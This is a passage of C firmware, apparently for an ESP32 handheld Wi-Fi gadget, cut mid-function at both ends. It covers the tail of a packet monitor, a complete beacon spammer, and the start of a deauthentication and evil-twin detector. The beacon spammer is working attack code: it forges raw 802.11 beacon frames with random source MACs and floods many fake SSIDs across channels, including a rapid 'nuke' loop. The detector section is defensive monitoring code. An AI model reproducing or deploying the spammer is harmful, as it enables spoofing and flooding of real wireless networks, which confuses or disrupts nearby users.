      if (slotIdx < PacketMonitor_PCAP_POOL_SIZE) {
        __auto_type s = &(PacketMonitor_pcapPool[slotIdx]);
        const size_t wroteHdr =
            storage_file_write(&(PacketMonitor_pcapFile),
                               (const uint8_t*)&(*s).hdr, sizeof((*s).hdr));
        const size_t wrotePkt = storage_file_write(&(PacketMonitor_pcapFile),
                                                   (*s).data, (*s).caplen);
        if (wroteHdr == sizeof((*s).hdr) && wrotePkt == (*s).caplen) {
          PacketMonitor_pcapPacketsWritten++;
        } else {
          PacketMonitor_pcapDisableAndCloseFile();
        }
      }
      xQueueSend(PacketMonitor_pcapFreeQ, &slotIdx, 0);
      drained++;
    }

    const uint32_t now = sys_monotonic_ms();
    if ((storage_file_valid(&(PacketMonitor_pcapFile)) &&
         (now - PacketMonitor_pcapLastFlushMs) > 1000)) {
      storage_file_flush(&(PacketMonitor_pcapFile));
      PacketMonitor_pcapLastFlushMs = now;
    }
  }

  display_draw_fast_h_line(&(tft), 0, 90, 240, UI_LINE);
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  PacketMonitor_do_sampling_FFT();
  sys_sleep_ms(10);
  PacketMonitor_epoch++;

  if (PacketMonitor_epoch >= display_width(&(tft))) PacketMonitor_epoch = 0;

  static uint32_t PacketMonitor_lastButtonTime = 0;
  const uint32_t debounceDelay = 200;

  bool leftButtonState = isButtonPressed(BTN_LEFT);
  bool rightButtonState = isButtonPressed(BTN_RIGHT);

  uint32_t currentTime = sys_monotonic_ms();

  if (leftButtonState && !PacketMonitor_btnLeftPressed &&
      (currentTime - PacketMonitor_lastButtonTime > debounceDelay)) {
    PacketMonitor_btnLeftPressed = true;
    PacketMonitor_setChannel(PacketMonitor_ch - 1);
    PacketMonitor_lastButtonTime = currentTime;
  } else if (!leftButtonState) {
    PacketMonitor_btnLeftPressed = false;
  }

  if (rightButtonState && !PacketMonitor_btnRightPressed &&
      (currentTime - PacketMonitor_lastButtonTime > debounceDelay)) {
    PacketMonitor_btnRightPressed = true;
    PacketMonitor_setChannel(PacketMonitor_ch + 1);
    PacketMonitor_lastButtonTime = currentTime;
  } else if (!rightButtonState) {
    PacketMonitor_btnRightPressed = false;
  }

  PacketMonitor_pkts[127] = PacketMonitor_tmpPacketCounter;

  PacketMonitor_tmpPacketCounter = 0;
  PacketMonitor_deauths = 0;
  PacketMonitor_rssiSum = 0;
}

bool BeaconSpammer_btnLeftPress;
bool BeaconSpammer_btnRightPress;
bool BeaconSpammer_btnSelectPress;

static const char* const BeaconSpammer_ssidList[] = {"404_SSID_Not_Found",
                                                     "Free_WiFi_Promise",
                                                     "PrettyFlyForAWiFi",
                                                     "Wi-Fight_The_Power",
                                                     "Tell_My_WiFi_LoveHer",
                                                     "Wu-Tang_LAN",
                                                     "LAN_of_the_Free",
                                                     "No_More_Data",
                                                     "Panic!_At_the_WiFi",
                                                     "HideYoKidsHideYoWiFi",
                                                     "Definitely_Not_A_Spy",
                                                     "Click_and_Die",
                                                     "DropItLikeItsHotspot",
                                                     "Loading...",
                                                     "I_AM_Watching_You",
                                                     "Why_Tho?",
                                                     "Get_Your_Own_WiFi",
                                                     "NSA_Surveillance_Van",
                                                     "WiFi_Fairy",
                                                     "Undercover_Potato",
                                                     "TheLANBeforeTime",
                                                     "ItHurtsWhen_IP",
                                                     "IPFreely",
                                                     "NoInternetHere",
                                                     "LookMaNoCables",
                                                     "Router?IHardlyKnewHer",
                                                     "ShutUpAndConnect",
                                                     "Mom_UseThisOne",
                                                     "Not_for_You",
                                                     "OopsAllSSID",
                                                     "ItsOver9000",
                                                     "Bob's_Wifi_Burgers",
                                                     "Overclocked_Toaster",
                                                     "Pikachu_Used_WiFi",
                                                     "Cheese_Bandit",
                                                     "Quantum_Tunnel",
                                                     "Meme_LANd"};

const int BeaconSpammer_ssidCount =
    sizeof(BeaconSpammer_ssidList) / sizeof(BeaconSpammer_ssidList[0]);

uint8_t BeaconSpammer_spamchannel = 1;
bool BeaconSpammer_spam = false;
int BeaconSpammer_y_offset = 20;

enum { BeaconSpammer_kSpamBodyTop = 37 };

static bool BeaconSpammer_spamYFits(int y, int h) {
  return y + h <= wifiContentBottom();
}

static int BeaconSpammer_spamMaxListLines(void) {
  const int startY = 130 + BeaconSpammer_y_offset;
  enum { lineH = 10 };
  const int avail = wifiContentBottom() - startY;
  if (avail <= 0) {
    return 0;
  }
  return avail / lineH;
}

static void BeaconSpammer_spamClearBody(void) {
  const int bodyH = wifiContentBottom() - BeaconSpammer_kSpamBodyTop;
  if (bodyH > 0) {
    display_fill_rect(&(tft), 0, BeaconSpammer_kSpamBodyTop,
                      display_width(&(tft)), bodyH, TFT_BLACK);
  }
}

static void BeaconSpammer_spamDrawIdleHint(void) {
  if (!BeaconSpammer_spamYFits(30 + BeaconSpammer_y_offset, 10)) {
    return;
  }
  display_set_text_font(&(tft), 1);
  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), UI_WARN, TFT_BLACK);
  display_set_cursor(&(tft), 2, 30 + BeaconSpammer_y_offset);
  display_print(&(tft), "[!] Press [UP] to start");
}

static void BeaconSpammer_spamUpdateNavLabels(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  setTouchNavLabels("Ch-", NULL, "Exit", BeaconSpammer_spam ? "Stop" : "Start",
                    "Ch+");
  redrawTouchButtonBar();
}

static void BeaconSpammer_spamRedrawChrome(void) {
  display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);
  display_draw_fast_h_line(&(tft), 0, 35, display_width(&(tft)), UI_LINE);
}

static void BeaconSpammer_spamDrawToolbarStatus(void) {
  display_set_text_font(&(tft), 1);
  display_fill_rect(&(tft), 35, 20, 95, 16, DARK_GRAY);
  display_set_text_size(&(tft), 1);

  display_set_text_color_2(&(tft), UI_TEXT, DARK_GRAY);
  display_set_cursor(&(tft), 35, 24);
  display_print(&(tft), "Ch:");
  display_set_text_color_2(&(tft), UI_ICON, DARK_GRAY);
  display_print(&(tft), (TEXT(BeaconSpammer_spamchannel)).data);

  display_set_text_color_2(&(tft), BeaconSpammer_spam ? UI_OK : UI_TEXT,
                           DARK_GRAY);
  display_set_cursor(&(tft), 70, 24);
  display_print(&(tft),
                (TEXT(BeaconSpammer_spam ? "Enabled " : "Disabled")).data);

  BeaconSpammer_spamRedrawChrome();
}

static uint8_t BeaconSpammer_lastSpamChannel = 0xFF;
static bool BeaconSpammer_lastSpamState = !false;

uint8_t BeaconSpammer_packet[128] = {
    0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02,
    0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xc0, 0x6c,
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0x64, 0x00, 0x01, 0x04,
    0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x01, 0x08, 0x82, 0x84,
    0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x04};

void BeaconSpammer_handleLeftButton(void) {
  BeaconSpammer_spamchannel =
      (BeaconSpammer_spamchannel == 1) ? 14 : BeaconSpammer_spamchannel - 1;
}

void BeaconSpammer_handleRightButton(void) {
  BeaconSpammer_spamchannel =
      (BeaconSpammer_spamchannel == 14) ? 1 : BeaconSpammer_spamchannel + 1;
}

void BeaconSpammer_handleSelectButton(void) {
  BeaconSpammer_spam = !BeaconSpammer_spam;
}

static void beacon_print_line(int y, uint16_t color, const char* text) {
  if (!BeaconSpammer_spamYFits(y, 10)) return;
  display_set_text_color_2(&tft, color, TFT_BLACK);
  display_set_cursor(&tft, 2, y);
  display_print(&tft, text);
}
void BeaconSpammer_output(void) {
  BeaconSpammer_spamClearBody();

  display_set_text_font(&(tft), 1);
  display_set_text_size(&(tft), 1);

  beacon_print_line(30 + BeaconSpammer_y_offset, UI_WARN, "[!] Preparing");
  for (int i = 0; i < 3; i++) {
    if (BeaconSpammer_spamYFits(30 + BeaconSpammer_y_offset, 10)) {
      display_print(&(tft), ".");
    }
    sys_sleep_ms(wifiRandInt_1(1000));
  }

  {
    const int y = 50 + BeaconSpammer_y_offset;
    if (BeaconSpammer_spamYFits(y, 10)) {
      display_set_text_color_2(&(tft), UI_TEXT, TFT_BLACK);
      display_set_cursor(&(tft), 2, y);
      display_print(&(tft), "[*] Configuring channel to (");
      display_set_text_color_2(&(tft), UI_ICON, TFT_BLACK);
      display_print(&(tft), (TEXT(BeaconSpammer_spamchannel)).data);
      display_set_text_color_2(&(tft), UI_TEXT, TFT_BLACK);
      display_print(&(tft), ")");
    }
  }
  sys_sleep_ms(wifiRandInt_1(500));

  beacon_print_line(70 + BeaconSpammer_y_offset, UI_WARN,
                    "[!] SSID generated successfully");
  sys_sleep_ms(wifiRandInt_1(500));

  beacon_print_line(80 + BeaconSpammer_y_offset, UI_WARN,
                    "[!] Setting random SRC MAC");
  sys_sleep_ms(wifiRandInt_1(500));

  beacon_print_line(110 + BeaconSpammer_y_offset, UI_TEXT,
                    "[*] Starting broadcast");
  sys_sleep_ms(wifiRandInt_1(500));

  const int maxLines = DIV_MIN(18, BeaconSpammer_spamMaxListLines());
  for (int i = 0; i < maxLines; i++) {
    const int y = 130 + i * 10 + BeaconSpammer_y_offset;
    if (!BeaconSpammer_spamYFits(y, 10)) {
      break;
    }
    text_t randomSSID =
        TEXT(BeaconSpammer_ssidList[wifiRandInt_1(BeaconSpammer_ssidCount)]);
    display_set_text_color_2(&(tft), WHITE, TFT_BLACK);
    display_set_cursor(&(tft), 2, y);
    display_print(&(tft), "[+] ");
    display_print(&(tft), (randomSSID).data);
    sys_sleep_ms(wifiRandInt_1(500));
  }

  maintainTouchNavBar();
}

void BeaconSpammer_spammer(void) {
  esp_wifi_set_channel(BeaconSpammer_spamchannel, WIFI_SECOND_CHAN_NONE);

  for (int i = 10; i <= 21; i++) {
    BeaconSpammer_packet[i] = (uint8_t)wifiRandU32(256);
  }

  text_t randomSSID =
      TEXT(BeaconSpammer_ssidList[wifiRandInt_1(BeaconSpammer_ssidCount)]);
  int ssidLength = strlen((randomSSID).data);
  BeaconSpammer_packet[37] = ssidLength;

  for (int i = 0; i < ssidLength; i++) {
    BeaconSpammer_packet[38 + i] = (randomSSID).data[i];
  }

  for (int i = 38 + ssidLength; i <= 43; i++) {
    BeaconSpammer_packet[i] = 0x00;
  }

  BeaconSpammer_packet[56] = BeaconSpammer_spamchannel;

  esp_wifi_80211_tx(WIFI_IF_AP, BeaconSpammer_packet, 57, false);

  taskYIELD();
}

void BeaconSpammer_beaconSpam(void) {
  text_t ssid = {
      .data =
          "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_"};
  uint8_t channel;

  uint8_t BeaconSpammer_packet[128] = {
      0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02,
      0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xc0, 0x6c,
      0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0x64, 0x00, 0x01, 0x04,
      0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x01, 0x08, 0x82, 0x84,
      0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x04};

  display_set_text_font(&(tft), 1);
  display_set_text_size(&(tft), 1);
  BeaconSpammer_spamClearBody();
  if (BeaconSpammer_spamYFits(30 + BeaconSpammer_y_offset, 10)) {
    display_set_text_color_2(&(tft), UI_WARN, TFT_BLACK);
    display_set_cursor(&(tft), 2, 30 + BeaconSpammer_y_offset);
    display_print(&(tft), "[!!] FUCK IT");
  }
  if (BeaconSpammer_spamYFits(50 + BeaconSpammer_y_offset, 10)) {
    display_set_text_color_2(&(tft), UI_TEXT, TFT_BLACK);
    display_set_cursor(&(tft), 2, 50 + BeaconSpammer_y_offset);
    display_print(&(tft), "[!!] Press [Select] to exit");
  }
  maintainTouchNavBar();

  sys_sleep_ms(500);

  esp_err_t err = network_init();
  if (err != ESP_OK) {
    printf("WiFi init failed: %d\n", err);
    return;
  }

  err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
  if (err != ESP_OK) {
    printf("Storage set failed: %d\n", err);
    return;
  }

  err = esp_wifi_set_mode(WIFI_MODE_AP);
  if (err != ESP_OK) {
    printf("Mode set failed: %d\n", err);
    return;
  }

  err = esp_wifi_start();
  if (err != ESP_OK) {
    printf("WiFi start failed: %d\n", err);
    return;
  }

  err = esp_wifi_set_promiscuous(true);
  if (err != ESP_OK) {
    printf("Promiscuous set failed: %d\n", err);
    return;
  }

  while (true) {
    channel = (uint8_t)wifiRandInt_2(1, 13);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    for (int i = 10; i <= 15; i++) {
      BeaconSpammer_packet[i] = (uint8_t)wifiRandU32(256);
    }
    for (int i = 16; i <= 21; i++) {
      BeaconSpammer_packet[i] = (uint8_t)wifiRandU32(256);
    }

    BeaconSpammer_packet[38] = (ssid).data[wifiRandInt_1(65)];
    BeaconSpammer_packet[39] = (ssid).data[wifiRandInt_1(65)];
    BeaconSpammer_packet[40] = (ssid).data[wifiRandInt_1(65)];
    BeaconSpammer_packet[41] = (ssid).data[wifiRandInt_1(65)];
    BeaconSpammer_packet[42] = (ssid).data[wifiRandInt_1(65)];
    BeaconSpammer_packet[43] = (ssid).data[wifiRandInt_1(65)];

    BeaconSpammer_packet[56] = channel;

    esp_err_t result;
    result = esp_wifi_80211_tx(WIFI_IF_AP, BeaconSpammer_packet, 57, false);
    if (result != ESP_OK) {
      printf("Packet 1 send failed: %d\n", result);
    }
    result = esp_wifi_80211_tx(WIFI_IF_AP, BeaconSpammer_packet, 57, false);
    if (result != ESP_OK) {
      printf("Packet 2 send failed: %d\n", result);
    }
    result = esp_wifi_80211_tx(WIFI_IF_AP, BeaconSpammer_packet, 57, false);
    if (result != ESP_OK) {
      printf("Packet 3 send failed: %d\n", result);
    }

    sys_sleep_ms(1);

    if (isButtonPressed(BTN_SELECT)) {
      break;
    }
  }
}

static bool BeaconSpammer_uiDrawn = false;

void BeaconSpammer_runUI(void) {
#define SCREEN_WIDTH TFT_WIDTH
#define SCREENHEIGHT TFT_HEIGHT
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {10, 190, 220};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
      bitmap_icon_go_back, bitmap_icon_start, bitmap_icon_nuke};

  if (!BeaconSpammer_uiDrawn) {
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, 120, STATUS_BAR_HEIGHT,
                      DARK_GRAY);
    display_fill_rect(&(tft), 120, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 120,
                      STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], ICON_SIZE,
                            ICON_SIZE, TFT_WHITE);
      }
    }
    BeaconSpammer_spamRedrawChrome();
    BeaconSpammer_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (sys_monotonic_ms() - lastAnimationTime >= 150) {
        display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                            ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;

    case 2:
      if (sys_monotonic_ms() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          feature_exit_requested = true;
          animationState = 0;
          activeIcon = -1;
          break;
        case 1:
          BeaconSpammer_handleSelectButton();
          if (BeaconSpammer_spam) {
            animationState = 4;
          } else {
            animationState = 0;
            activeIcon = -1;
          }
          break;
        case 2:
          BeaconSpammer_beaconSpam();
          animationState = 0;
          activeIcon = -1;
          break;
      }
      break;

    case 4:
      if (BeaconSpammer_spam) {
        if (sys_monotonic_ms() - lastSpamTime >= 50) {
          BeaconSpammer_spammer();
          lastSpamTime = sys_monotonic_ms();
        }
      } else {
        animationState = 0;
        activeIcon = -1;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 0) {
                feature_exit_requested = true;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i],
                                    ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

void BeaconSpammer_beaconSpamSetup(void) {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  BeaconSpammer_spam = false;
  BeaconSpammer_spamUpdateNavLabels();
  featureClearContent(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, true);
  redrawTouchButtonBar();

  setupTouchscreen();

  BeaconSpammer_spamDrawIdleHint();

  display_fill_rect(&(tft), 0, 20, 120, 16, DARK_GRAY);
  display_fill_rect(&(tft), 120, 20, display_width(&(tft)) - 120, 16,
                    DARK_GRAY);

  BeaconSpammer_lastSpamChannel = 0xFF;
  BeaconSpammer_lastSpamState = !BeaconSpammer_spam;
  BeaconSpammer_spamDrawToolbarStatus();

  esp_err_t err;
  err = network_init();
  if (err != ESP_OK) printf("WiFi init failed: %d\n", err);

  err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
  if (err != ESP_OK) printf("Storage set failed: %d\n", err);

  err = esp_wifi_set_mode(WIFI_MODE_AP);
  if (err != ESP_OK) printf("Mode set failed: %d\n", err);

  err = esp_wifi_start();
  if (err != ESP_OK) printf("WiFi start failed: %d\n", err);

  err = esp_wifi_set_promiscuous(true);
  if (err != ESP_OK) printf("Promiscuous set failed: %d\n", err);

#if HAS_PCF8574_BUTTONS
  pcf8574_configure_pin(button_input_device(), BTN_UP, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_DOWN, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_LEFT, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_RIGHT, GPIO_MODE_INPUT);
#endif

  BeaconSpammer_uiDrawn = false;
  BeaconSpammer_runUI();
  redrawTouchButtonBar();
}

void BeaconSpammer_beaconSpamLoop(void) {
  if (feature_active &&
      (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    feature_exit_requested = true;
    return;
  }

  BeaconSpammer_runUI();
  updateStatusBar();
  BeaconSpammer_spamRedrawChrome();

  BeaconSpammer_btnLeftPress = isButtonPressed(BTN_LEFT);
  BeaconSpammer_btnRightPress = isButtonPressed(BTN_RIGHT);
  BeaconSpammer_btnSelectPress = isButtonPressed(BTN_UP);

  sys_sleep_ms(10);

  if (BeaconSpammer_btnLeftPress) {
    BeaconSpammer_handleLeftButton();
    sys_sleep_ms(200);
  }
  if (BeaconSpammer_btnRightPress) {
    BeaconSpammer_handleRightButton();
    sys_sleep_ms(200);
  }
  if (BeaconSpammer_btnSelectPress) {
    BeaconSpammer_handleSelectButton();
    sys_sleep_ms(200);
  }

  if (BeaconSpammer_lastSpamChannel != BeaconSpammer_spamchannel ||
      BeaconSpammer_lastSpamState != BeaconSpammer_spam) {
    BeaconSpammer_spamDrawToolbarStatus();

    if (BeaconSpammer_lastSpamState != BeaconSpammer_spam) {
      BeaconSpammer_spamUpdateNavLabels();
      if (BeaconSpammer_lastSpamState && !BeaconSpammer_spam) {
        BeaconSpammer_spamClearBody();
        BeaconSpammer_spamDrawIdleHint();
      } else if (!BeaconSpammer_lastSpamState && BeaconSpammer_spam) {
        BeaconSpammer_spamClearBody();
      }
    }

    BeaconSpammer_lastSpamChannel = BeaconSpammer_spamchannel;
    BeaconSpammer_lastSpamState = BeaconSpammer_spam;
  }

  while (BeaconSpammer_spam) {
    BeaconSpammer_runUI();
    if (feature_exit_requested || featureExitButtonPressed()) {
      BeaconSpammer_spam = false;
      break;
    }

    BeaconSpammer_spammer();

    if (BeaconSpammer_btnSelectPress) {
      BeaconSpammer_output();
    }

    if (!isButtonPressed(BTN_UP)) {
      sys_sleep_ms(50);
      break;
    }
  }
}

#undef LINE_HEIGHT
#define LINE_HEIGHT 12
enum { DeauthDetect_DEAUTH_TERM_CAPACITY = 24 };

static int DeauthDetect_deauthVisibleLines(void) {
  return DIV_MIN(DeauthDetect_DEAUTH_TERM_CAPACITY,
                 wifiMaxLinesInZone(45, LINE_HEIGHT));
}

#define MAX_NETWORKS 50
#define MAX_CHANNELS 14
#undef MAX_SSID_LENGTH
#define MAX_SSID_LENGTH 8

#define SCREEN_WIDTH TFT_WIDTH
#define SCREENHEIGHT TFT_HEIGHT
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 2

bool DeauthDetect_stopScan = false;
bool DeauthDetect_exitMode = false;

enum {
  DeauthDetect_terminalBuffer_COUNT = DeauthDetect_DEAUTH_TERM_CAPACITY,
  DeauthDetect_terminalBuffer_OFFSET = 0
};
_Static_assert(DeauthDetect_terminalBuffer_OFFSET +
                       DeauthDetect_terminalBuffer_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define DeauthDetect_terminalBuffer                  \
  (*(text_t(*)[DeauthDetect_terminalBuffer_COUNT]) & \
   feature_text_slots[DeauthDetect_terminalBuffer_OFFSET])
uint16_t DeauthDetect_colorBuffer[DeauthDetect_DEAUTH_TERM_CAPACITY];
int DeauthDetect_lineIndex = 0;

int DeauthDetect_deauth[MAX_NETWORKS] = {0};
enum {
  DeauthDetect_ssidLists_COUNT = MAX_NETWORKS,
  DeauthDetect_ssidLists_OFFSET = DeauthDetect_terminalBuffer_OFFSET +
      DeauthDetect_terminalBuffer_COUNT
};
_Static_assert(DeauthDetect_ssidLists_OFFSET + DeauthDetect_ssidLists_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define DeauthDetect_ssidLists                  \
  (*(text_t(*)[DeauthDetect_ssidLists_COUNT]) & \
   feature_text_slots[DeauthDetect_ssidLists_OFFSET])
uint8_t DeauthDetect_macList[MAX_NETWORKS][6];

static volatile bool DeauthDetect_deauthAlertPending = false;
static volatile int DeauthDetect_deauthAlertIndex = -1;

typedef uint8_t DeauthDetect_DeauthPhase;
enum { DeauthDetect_DeauthPhase_Listen, DeauthDetect_DeauthPhase_Scanning };
static DeauthDetect_DeauthPhase DeauthDetect_s_phase =
    DeauthDetect_DeauthPhase_Scanning;
static bool DeauthDetect_s_asyncScanActive = false;
static bool DeauthDetect_s_scanBannerShown = false;
static unsigned long DeauthDetect_s_listenUntilMs = 0;
static int DeauthDetect_s_knownNetworkCount = 0;

static int DeauthDetect_iconX[ICON_NUM] = {210, 10};
static int DeauthDetect_iconY = STATUS_BAR_Y_OFFSET;
static const unsigned char* DeauthDetect_icons[ICON_NUM] = {
    bitmap_icon_power, bitmap_icon_go_back};

void DeauthDetect_scrollTerminal(void) {
  const int cap = DeauthDetect_deauthVisibleLines();
  for (int i = 0; i < cap - 1; i++) {
    DeauthDetect_terminalBuffer[i] = DeauthDetect_terminalBuffer[i + 1];
    DeauthDetect_colorBuffer[i] = DeauthDetect_colorBuffer[i + 1];
  }
}

void DeauthDetect_displayPrint(text_t text, uint16_t color, bool extraSpace) {
  if (!feature_active || DeauthDetect_exitMode) {
    return;
  }

  const int cap = DeauthDetect_deauthVisibleLines();
  if (DeauthDetect_lineIndex >= cap - 1) {
    DeauthDetect_scrollTerminal();
    DeauthDetect_lineIndex = cap - 1;
  }

  DeauthDetect_terminalBuffer[DeauthDetect_lineIndex] = text;
  DeauthDetect_colorBuffer[DeauthDetect_lineIndex] = color;
  DeauthDetect_lineIndex++;

  if (extraSpace && DeauthDetect_lineIndex < cap) {
    DeauthDetect_terminalBuffer[DeauthDetect_lineIndex] = TEXT("");
    DeauthDetect_colorBuffer[DeauthDetect_lineIndex] = UI_TEXT;
    DeauthDetect_lineIndex++;
  }

  const int bodyBottom = wifiContentBottom();
  for (int i = 0; i < DeauthDetect_lineIndex; i++) {
    int yPos = i * LINE_HEIGHT + 45;
    if (yPos + LINE_HEIGHT > bodyBottom) {
      break;
    }
    display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);
    display_fill_rect(&(tft), 5, yPos, display_width(&(tft)) - 10, LINE_HEIGHT,
                      TFT_BLACK);
    display_set_text_color_2(&(tft), DeauthDetect_colorBuffer[i], TFT_BLACK);
    display_set_cursor(&(tft), 5, yPos);
    display_print(&(tft), (DeauthDetect_terminalBuffer[i]).data);
  }
}

void DeauthDetect_checkButtonPress(void) {
  if (!isButtonPressed(BTN_UP)) {
    return;
  }
  sys_sleep_ms(200);
  if (!DeauthDetect_stopScan) {
    DeauthDetect_stopScan = true;
    DeauthDetect_displayPrint(TEXT("[!] Scanning Stopped"), UI_WARN, true);
    DeauthDetect_displayPrint(TEXT("[!] Press [Select] to Exit"), UI_WARN,
                              false);
  } else {
    DeauthDetect_exitMode = true;
  }
}

void DeauthDetect_snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!feature_active || DeauthDetect_stopScan || DeauthDetect_exitMode) return;

  wifi_promiscuous_pkt_t* packet = (wifi_promiscuous_pkt_t*)buf;
  if (!packet) {
    return;
  }
  uint8_t* payload = packet->payload;

  if (type == WIFI_PKT_MGMT) {
    uint8_t frameType = payload[0];

    if (frameType == 0xC0) {
      uint8_t senderMAC[6];
      memcpy(senderMAC, payload + 10, 6);

      for (int i = 0; i < MAX_NETWORKS; i++) {
        if (memcmp(senderMAC, DeauthDetect_macList[i], 6) == 0) {
          DeauthDetect_deauth[i]++;
          DeauthDetect_deauthAlertIndex = i;
          DeauthDetect_deauthAlertPending = true;
          break;
        }
      }
    }
  }
}

static void DeauthDetect_deauthFlushPendingAlert(void) {
  if (!DeauthDetect_deauthAlertPending) {
    return;
  }
  DeauthDetect_deauthAlertPending = false;
  const int i = DeauthDetect_deauthAlertIndex;
  if (i >= 0 && i < MAX_NETWORKS) {
    DeauthDetect_displayPrint(text_join_cstr("[!] Deauth Attack on: ",
                                             (DeauthDetect_ssidLists[i]).data),
                              UI_WARN, true);
  }
}

static void DeauthDetect_deauthPopulateScanResults(int n) {
  DeauthDetect_s_knownNetworkCount = DIV_MIN(n, MAX_NETWORKS);
  for (int i = 0; i < DeauthDetect_s_knownNetworkCount; i++) {
    text_t fullSSID = network_ssid(i);
    DeauthDetect_ssidLists[i] = text_slice(fullSSID, 0, MAX_SSID_LENGTH);
    const uint8_t* bssid = network_bssid(i);
    if (bssid) {
      memcpy(DeauthDetect_macList[i], bssid, 6);
    } else {
      memset(DeauthDetect_macList[i], 0, 6);
    }

    char line[180];
    snprintf(line, sizeof(line), "[+] %.32s%s | CH: %u | RSSI: %d",
             (DeauthDetect_ssidLists[i]).data,
             strlen((fullSSID).data) > MAX_SSID_LENGTH ? "..." : "",
             (unsigned)network_channel(i), (int)network_rssi(i));
    DeauthDetect_displayPrint(TEXT(line), FEATURE_TEXT, false);
    if (DeauthDetect_exitMode || DeauthDetect_stopScan) {
      break;
    }
  }
}

void DeauthDetect_analyzeNetworks(int n) {
  DeauthDetect_displayPrint(TEXT("[*] Checking for Suspicious Networks"),
                            UI_TEXT, true);

  for (int i = 0; i < n; i++) {
    if (DeauthDetect_exitMode) {
      return;
    }

    bool isDuplicate = false;
    bool isHidden = ((strcmp((DeauthDetect_ssidLists[i]).data, "") == 0));
    bool isWeirdChannel = network_channel(i) > 13;

    for (int j = 0; j < n; j++) {
      if (i != j &&
          (strcmp((DeauthDetect_ssidLists[i]).data,
                  (DeauthDetect_ssidLists[j]).data) == 0) &&
          memcmp(DeauthDetect_macList[i], DeauthDetect_macList[j], 6) != 0) {
        isDuplicate = true;
        break;
      }
    }

    if (isHidden) {
      DeauthDetect_displayPrint(TEXT("[!] Hidden SSID Detected!"), UI_WARN,
                                true);
    }
    if (isDuplicate) {
      DeauthDetect_displayPrint(
          text_join_cstr("[!] Evil Twin: ", (DeauthDetect_ssidLists[i]).data),
          UI_WARN, true);
    }
    if (isWeirdChannel) {
      char line[64];
      snprintf(line, sizeof(line), "[!] Non-Standard Channel: %u",
               (unsigned)network_channel(i));
      DeauthDetect_displayPrint(TEXT(line), UI_WARN, true);
    }

    if (DeauthDetect_deauth[i] > 5) {
      char line[160];
      snprintf(line, sizeof(line),
               "[!!!] 1 DEAUTH ATTACK on %.32s (%d attacks)",
               (DeauthDetect_ssidLists[i]).data, (int)DeauthDetect_deauth[i]);
